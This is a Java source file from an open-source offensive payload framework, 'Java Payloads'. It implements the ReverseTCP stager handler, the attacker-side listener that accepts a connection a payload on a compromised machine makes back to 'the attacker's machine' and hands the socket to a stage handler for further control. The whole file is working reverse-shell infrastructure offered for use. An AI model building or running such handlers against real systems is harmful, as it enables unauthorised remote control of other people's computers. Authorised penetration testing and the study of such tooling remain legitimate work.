/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stager;

import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;

import javapayload.Parameter;
import javapayload.handler.stage.StageHandler;

public class ReverseTCP extends ListeningStagerHandler {

	public ReverseTCP() {
		super("Connect to a TCP port",  true, true, "Connect to a TCP port on the attacker's machine.");
	};
	
	public Parameter[] getParameters() {
		return new Parameter[] {
				new Parameter("LHOST", false, Parameter.TYPE_HOST, "Local host to connect to"),
				new Parameter("LPORT", false, Parameter.TYPE_PORT_HASH, "Local port to connect to, or # to auto-bind.")
		};
	}
	
	private ServerSocket serverSocket = null;
	
	protected void startListen(String[] parameters) throws Exception {
		if (serverSocket == null) {
			serverSocket = new ServerSocket(Integer.parseInt(parameters[2]));
		}
	}
	
	protected Object acceptSocket() throws Exception {
		return serverSocket.accept();
	}
	
	protected void stopListen() throws Exception {
		serverSocket.close();
		serverSocket = null;
	}
	
	protected void handleSocket(Object socket, StageHandler stageHandler, String[] parameters, PrintStream errorStream) throws Exception {
		Socket s = (Socket) socket;
		stageHandler.handle(s.getOutputStream(), s.getInputStream(), parameters);
	}
	
	protected boolean prepare(String[] parametersToPrepare) throws Exception {
		if (parametersToPrepare[2].equals("#")) {
			serverSocket = new ServerSocket(0);
			parametersToPrepare[2] = ""+serverSocket.getLocalPort();	
			return true;
		}
		return false;
	}
	
	protected String getTestArguments() {
		return "localhost #";
	}
}
